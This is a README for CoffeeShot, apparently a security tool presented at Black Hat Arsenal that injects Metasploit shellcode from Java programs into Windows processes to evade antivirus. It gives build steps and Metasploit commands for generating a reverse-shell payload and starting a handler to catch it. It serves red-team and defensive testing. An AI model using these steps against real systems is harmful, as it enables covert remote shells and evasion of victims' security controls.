![CoffeeShot](https://i.imgur.com/zH0Yvis.png)

# :coffee: CoffeeShot: Avoid Detection with Memory Injection :syringe:
[![Arsenal](https://github.com/toolswatch/badges/blob/master/arsenal/usa/2018.svg)](https://www.toolswatch.org/2018/05/black-hat-arsenal-usa-2018-the-w0w-lineup/)

CoffeeShot is an evasion framework that injects payload from Java-based programs into designated processes on Microsoft Windows.

CoffeeShot assists blue team members in assessing the effectiveness of their anti-malware measures against malicious software written in Java. Red team members and pen testers can also use CoffeeShot to bypass the target’s security controls. 

CoffeShot utilizes JNA (Java Native Access) to inject payload from Java-based programs into designated processes on Microsoft Windows.

The memory injection methods that CoffeeShot employs are straightforward and are well-known in the context of traditional, compiled executables. The effectiveness of these techniques at evading AV when they’re implemented in Java, highlights the brittle nature even by modern antivirus tools.

## Prerequisites:
* Eclipse (or any other IDE that supports Java)
* [Java Native Access](https://github.com/java-native-access/jna)
* Kali Linux with Metasploit

## Getting Started
1. Clone the project.
2. Import to Eclipse.
3. Add JNA and JNA-Platform libraries.
4. Insert your generated shellcode inside CoffeeShot project.
5. Build the Project.
6. Export to a runnable JAR file.

## Setup
### Add JNA and JNA-Platform libraries
- Start Eclipse
- In the project explorer, right-click on CoffeeShot folder, and select "Properties"
- Select "Java Build Path" on the left, and then the "Libraries" tab. Now, click the "Add External JARS..." button
- Locate and select "jna-4.5.0.jar" and "jna-platform-4.5.0.jar" files you downloaded from the [JNA](https://github.com/java-native-access/jna) github, and then click "Open"
- Finally, click "OK" to close the dialog box. You will know that everything went ok if, when you open your project folder, you see an item called "Referenced Libraries", and upon expanding this item, you see the packages "jna-4.5.0.jar" and "jna-platform-4.5.0.jar" listed.

## Build CoffeeShot with your shellCode
```
Copy our generated shellCode from Metasploit.
Paste\Insert the shellCode inside the CoffeeShot project, e.g.: "byte[] shellcode = {(byte) 0xfc, (byte) 0xe8...};"
Build the project
Export to runnable JAR
Execute CoffeeShot by:
> Java -jar CoffeeShot.jar [processName]
> processName example: notepad++.exe
```

## Demo
For demo purpose, we used Metasploit with shell reverse tcp

### Create a Java shellcode that is suitable for CoffeeShot
```
msfconsole
use payload/windows/shell_reverse_tcp
set LHOST x.x.x.x
set LPORT xxxx
generate -t java
```

### Create C2 for our shellcode
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST
set LPORT
set ExitOnSession false
exploit -j
sessions
sessions -i 1
```

[![CoffeeShot Demo](https://i.imgur.com/nT0ZYl5.png)](https://youtu.be/MVwkjWB-Nx4)

## References
[Minerva Labs Blog Post](https://blog.minerva-labs.com/coffeeshot-avoid-detection-with-memory-injection)

## Authors
* **Asaf Aprozper (3pun0x)** - *Creator* - [Twitter](https://twitter.com/3pun0x) - [GitHub](https://github.com/3pun0x) 

## License
This project is licensed under the GPLv3 License - see the [LICENSE.md](https://www.gnu.org/licenses/gpl.html) file for details
Copyright © 2018 Minerva Labs CoffeeShot.  All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
